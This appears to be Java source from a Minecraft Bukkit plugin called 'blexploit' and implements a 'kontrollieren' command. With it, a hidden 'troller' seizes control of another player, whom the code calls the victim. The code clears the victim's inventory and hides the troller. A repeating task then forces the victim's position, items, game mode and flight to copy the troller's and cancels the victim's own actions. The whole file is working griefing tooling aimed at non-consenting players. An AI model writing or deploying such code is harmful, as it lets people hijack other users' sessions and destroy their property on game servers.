package de.blexploit.command.cmds;

import java.util.HashMap;

import org.bukkit.Bukkit;
import org.bukkit.Effect;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.inventory.ItemStack;

import api.Fehler;
import api.PacketManager;
import de.blexploit.Start;
import de.blexploit.command.Command;
import de.blexploit.inventory.creator.InvItem;
import de.blexploit.inventory.creator.InvItemManager;
import de.blexploit.inventory.items.SONSTIGES.FakeLeave;
import de.blexploit.manager.TabManager;
import de.blexploit.players.Mittrollers;
import de.blexploit.players.create.MittrollerEntity;

public final class Kontrollieren extends Command implements Listener {

	public HashMap<MittrollerEntity, Player> Gruppe = new HashMap<MittrollerEntity, Player>();

	public Kontrollieren() {
		super("kontrollieren", "Kontrolliere Spieler", TabManager.INSERT_PLAYERNAME);
	}

	@EventHandler
	private void onInteract(PlayerInteractEvent e) {
		if (Gruppe.size() == 0) {
			return;
		}
		try {
			if (e.getAction() == Action.LEFT_CLICK_AIR || e.getAction() == Action.LEFT_CLICK_BLOCK) {
				MittrollerEntity mt = Mittrollers.getP(e.getPlayer());
				if (mt != null) {
					if (Gruppe.containsKey(mt)) {
						Player victim = Gruppe.get(mt);
						shakeHand(victim);
					}
				} else if (Gruppe.containsValue(e.getPlayer())) {
					e.setCancelled(true);
				}
			}
		} catch (Exception e2) {
		}
	}

	private void shakeHand(Player victim) {
		try {
			Class<?> entityClass = PacketManager.getNMSClass("Entity");
			PacketManager pm = new PacketManager("PacketPlayOutAnimation", entityClass, int.class);
			pm.sendTo(victim, PacketManager.getEntityPlayer(victim), 0);
		} catch (Exception e) {
		}
	}

	@SuppressWarnings("deprecation")
	@EventHandler
	private void onBlockBreak(BlockBreakEvent e) {
		if (Gruppe.size() == 0) {
			return;
		}
		MittrollerEntity mt = Mittrollers.getP(e.getPlayer());
		if (mt != null) {
			if (Gruppe.containsKey(mt)) {
				Player victim = Gruppe.get(mt);
				shakeHand(victim);
				e.getBlock().getWorld().playEffect(e.getBlock().getLocation(), Effect.STEP_SOUND,
						e.getBlock().getType().getId());
				e.setCancelled(true);
				e.getBlock().setType(Material.AIR);
			}
		} else if (Gruppe.containsValue(e.getPlayer())) {
			e.setCancelled(true);
		}
	}

	@EventHandler
	private void onBlockPlace(BlockPlaceEvent e) {
		if (Gruppe.size() == 0) {
			return;
		}
		MittrollerEntity mt = Mittrollers.getP(e.getPlayer());
		if (mt != null) {
			if (Gruppe.containsKey(mt)) {
				Player victim = Gruppe.get(mt);
				shakeHand(victim);
			}
		} else if (Gruppe.containsValue(e.getPlayer())) {
			e.setCancelled(true);
		}
	}

	@EventHandler
	private void onPlayerLeave(PlayerQuitEvent e) {
		if (Gruppe.size() == 0) {
			return;
		}
		MittrollerEntity mt = Mittrollers.getP(e.getPlayer());
		if (mt != null) {
			if (Gruppe.containsKey(mt)) {
				Gruppe.remove(mt);
				if (Gruppe.size() == 0) {
					Bukkit.getScheduler().cancelTask(sheduler);
				}
			}
		} else {
			if (Gruppe.containsValue(e.getPlayer())) {
				for (MittrollerEntity mtAll : Gruppe.keySet()) {
					if (Gruppe.get(mtAll).equals(e.getPlayer())) {
						Gruppe.remove(mtAll);
						mtAll.sendMessage("Dein Ofer hat das Spiel verlassen :D");
						if (mtAll.isVanish()) {
							mtAll.sendMessage("$cDU BEFINDEST DICH IMMERNOCH IM VANISH!");
						}
					}
				}
			}
		}
	}

	@Override
	public void run(String[] args, MittrollerEntity mt) {
		if (args.length == 2) {
			Player victim = api.Get.player(args[1]);
			if (victim != null) {
				if (mt.getPlayer().equals(victim)) {
					mt.fehler("Dich selbst zu kontrollieren ergibt voll Sinn!");
					return;
				}
				if (Gruppe.containsKey(mt) || Gruppe.containsValue(victim)) {
					if (!Gruppe.containsKey(mt) && Gruppe.containsValue(victim)) {
						mt.fehler("Dieser Spieler wird schon kontrolliert!");
						return;
					}
					Gruppe.remove(mt);
					this.SpielerInfo(mt, "kontrolliert nun nicht mehr $c" + victim.getName() + CHAT_COLOR + ".");
					if (mt.isVanish()) {
						mt.sendMessage("$cDU BEFINDEST DICH IMMERNOCH IM VANISH!");
					}
					if (Gruppe.size() == 0) {
						Bukkit.getScheduler().cancelTask(sheduler);
					}
					mt.getPlayer().showEntity(Start.instance, victim);
					for (InvItem i : InvItemManager.invitems) {
						if (i.getDisplayname().equalsIgnoreCase("Unsichtbar")) {
							mt.getPlayer().getInventory().setItemInMainHand(i.getRealItemStack());
						}
					}
				} else {
					victim.getInventory().clear();
					if (!mt.isVanish()) {
						FakeLeave.hideMittroller(mt);
					}
					mt.getPlayer().hideEntity(Start.instance, victim);
					mt.getPlayer().teleport(victim);
					Gruppe.put(mt, victim);
					this.SpielerInfo(mt, "kontrolliert nun $c" + victim.getName() + this.CHAT_COLOR + ".");

					if (!Bukkit.getScheduler().isCurrentlyRunning(sheduler)) {
						runnable();
					}
				}
			} else {
				mt.fehler(Fehler.PLAYER_NOT_FOUND);
			}
		} else {
			mt.fehler(Fehler.ARGUMENT_EXCEPTION);
			mt.benutze(this);
		}
	}

	private int sheduler;

	private void runnable() {
		sheduler = Bukkit.getScheduler().scheduleSyncRepeatingTask(Start.instance, new Runnable() {

			@Override
			public void run() {
				for (MittrollerEntity mt : Gruppe.keySet()) {
					Player victim = Gruppe.get(mt);
					if (victim.isOnline() && mt.isOnline()) {
						victim.teleport(mt.getPlayer().getLocation());
						victim.getInventory().setHeldItemSlot(mt.getPlayer().getInventory().getHeldItemSlot());

						for (int i = 0; i < mt.getPlayer().getInventory().getMaxStackSize(); i++) {
							try {
								if (mt.getPlayer().getInventory().getItem(i) != null) {
									if (!mt.getPlayer().getInventory().getItem(i).hasItemMeta()) {
										victim.getInventory().setItem(i, mt.getPlayer().getInventory().getItem(i));
									} else {
										victim.getInventory().setItem(i, new ItemStack(Material.AIR));
									}
								}
							} catch (Exception e) {
							}
						}
						victim.updateInventory();
						victim.setGameMode(mt.getPlayer().getGameMode());
						victim.setAllowFlight(true);
						victim.setFlying(true);
						victim.closeInventory();
					}
				}
			}
		}, 0, 0);
	}

}
